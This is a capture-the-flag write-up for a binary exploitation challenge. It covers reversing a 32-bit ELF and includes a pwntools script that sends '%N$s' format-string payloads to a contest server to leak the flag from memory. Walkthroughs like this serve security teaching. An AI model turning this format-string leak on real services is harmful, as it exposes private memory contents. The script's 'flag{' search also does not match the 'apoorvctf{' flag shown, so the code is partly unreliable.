# !Kogarashi Café - The Secret Blend  

**Category:** Binary Exploitation  

A challenge that involves analyzing a binary and exploiting format string vulnerabilities to retrieve the flag.  

---

### Challenge  

**Provided File:** `secret_blend`  

---

## Overview  

1. **Analyzing the Binary**  
   - Use `file secret_blend` to determine the binary type:
     ```sh
     ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=00003bb9e0cd2a32ea61c4b60004ed82aa94d4a9, not stripped
     ```
   - Run `strings secret_blend` to find readable text inside:
     ```sh
     Barista: 'The special blend is missing...
     ```
   - Disassemble the binary using `objdump`:
     ```sh
     objdump -d secret_blend > disassembly.txt
     ```
   - Load the binary in **Ghidra** or **Binary Ninja** to reverse-engineer its logic.  

2. **Identifying the Vulnerability**  
   - The binary contains a **format string vulnerability** that can be exploited to leak memory and extract the flag.
   - The challenge is to find the correct offset in the format string to retrieve the flag.  

---

## Steps to Exploit  

1. **Check Binary Properties**  
   ```sh
   file secret_blend  
   checksec --file=secret_blend  
   strings secret_blend  
   ```

2. **Reverse Engineer the Binary**  
   - Load in **Ghidra** or **Binary Ninja** to analyze its functions and identify vulnerable inputs.  
   - The program does not properly sanitize user input, making it susceptible to a format string attack.  

3. **Exploit Format String Vulnerability**  
   - Use a script to test different offsets and locate the flag in memory.  

---

## Exploit Script  

```python
#!/usr/bin/env python3
from pwn import *

def test_offset(offset):
    try:
        # Create a new connection for each attempt
        p = remote("chals1.apoorvctf.xyz", 3003)
        # Wait until the prompt appears (using bytes)
        p.recvuntil(b"What will you have?")
        # Craft the payload for the given offset
        payload = f"%{offset}$s".encode()
        p.sendline(payload)
        # Use recvall to get all data until the connection closes
        response = p.recvall(timeout=2)
        p.close()
        return response
    except EOFError:
        # If the connection is closed before we receive data, return empty bytes
        return b""

def main():
    flag = None
    # Try offsets 1 through 15 to see which one leaks the flag
    for offset in range(1, 16):
        response = test_offset(offset)
        print(f"Offset {offset}: {response}")
        if b"flag{" in response:
            flag = response
            log.success("Flag found: " + flag.decode(errors="ignore"))
            break
    if flag is None:
        log.error("Flag not found. Adjust the offset range if needed.")

if __name__ == "__main__":
    main()
```

---

## Extracted Flag  

```
apoorvctf{Th3_M3nu_L34ks_M0re_Than_It_Sh0uld}
```

This write-up details the steps taken to analyze the binary, identify the vulnerability, and exploit it to retrieve the flag.

